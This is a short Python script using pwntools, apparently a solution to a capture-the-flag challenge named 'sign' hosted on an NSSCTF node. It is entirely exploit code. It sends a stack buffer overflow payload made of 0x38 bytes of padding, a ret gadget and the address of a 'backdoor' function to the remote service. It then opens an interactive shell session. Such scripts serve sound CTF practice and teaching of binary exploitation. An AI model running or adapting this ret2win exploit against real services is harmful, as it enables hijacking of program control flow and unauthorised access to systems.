from pwn import *

#io = process("./sign")
io = remote("node4.anna.nssctf.cn", 22703)

backdoor = 0x401232
ret = 0x40101a

payload = b"a" * (0x30 + 0x8) + p64(ret) + p64(backdoor)

io.sendline(payload)

io.interactive()
